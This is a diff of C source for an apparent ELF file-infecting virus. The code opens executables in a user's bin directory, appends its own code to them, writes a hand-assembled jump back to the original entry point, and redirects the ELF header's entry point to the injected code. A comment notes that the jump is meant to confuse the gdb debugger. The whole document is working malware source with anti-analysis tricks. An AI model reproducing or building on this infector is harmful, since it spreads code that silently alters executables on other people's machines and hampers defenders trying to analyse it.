@@ -83,7 +83,7 @@ static inline long syscall1(int num, long a1)
 {
 	long ret;
 	__asm__ __volatile__ (
-		"syscall\n"
+		"syscall"
 		: "=a" (ret) /* output */
 		: "a" (num), "D" (a1) /* input */
 	        : /* clobered */
@@ -96,7 +96,7 @@ static inline long syscall3(int num, long a1, long a2, long a3)
 {
 	long ret;
 	__asm__ __volatile__ (
-		"syscall\n"
+		"syscall"
 		: "=a" (ret) /* output */
 		: "a" (num), "D" (a1), "S" (a2), "d" (a3) /* input */
 	        : /* clobered */
@@ -114,8 +114,12 @@ static inline void memcpy(long src_addr, long dst_addr, long size)
 	}
 }
 
-void _start(void) __attribute__((aligned(16)));
+union addr {
+	long addr;
+	unsigned char b[8];
+};
 
+void _start(void) __attribute__((aligned(16)));
 void _start(void)
 {
 label1: ;
@@ -127,6 +131,8 @@ label1: ;
 	unsigned long code_size;
 	unsigned long real_code_size;
 	Elf64_Half p;
+	unsigned char jmp[12];
+
 
 	a[0] = 'a';
 	a[1] = 'a';
@@ -137,7 +143,8 @@ label1: ;
 	/* loop: for all elf files in /home/user/bin */
 	volatile long fd = open(a, O_RDWR, 0);
 	if (fd < 0) {
-		_exit(3);
+		goto label2;
+		//_exit(3);
 	}
 	volatile long n = read(fd, &ehdr, sizeof(ehdr));
 	if (ehdr.e_ident[0] != 0x7f
@@ -166,6 +173,31 @@ label1: ;
 			lseek(fd, offset, SEEK_SET);
 			/* add code */
 			write(fd, (long)_start, real_code_size);
+
+			/* change code */
+			/* movabs old_entry_point, %rax
+			 * jmpq *%rax
+			 */
+			jmp[0] = '\x48';
+			jmp[1] = '\xb8';
+			jmp[10] = '\xff';
+			jmp[11] = '\xe0';
+
+			/* some instructions after label2 are not copyed
+			 * so I use this space to add jump...
+			 * as a side effect it generates jump inside
+			 * instruction so it mess gdb :) */
+			union addr c = { .addr = ehdr.e_entry };
+			jmp[2] = c.b[0];
+			jmp[3] = c.b[1];
+			jmp[4] = c.b[2];
+			jmp[5] = c.b[3];
+			jmp[6] = c.b[4];
+			jmp[7] = c.b[5];
+			jmp[8] = c.b[6];
+			jmp[9] = c.b[7];
+			lseek(fd, 7, SEEK_CUR);
+			write(fd, jmp, 12);
 
 			/* change elf header entry point */
 			ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz;
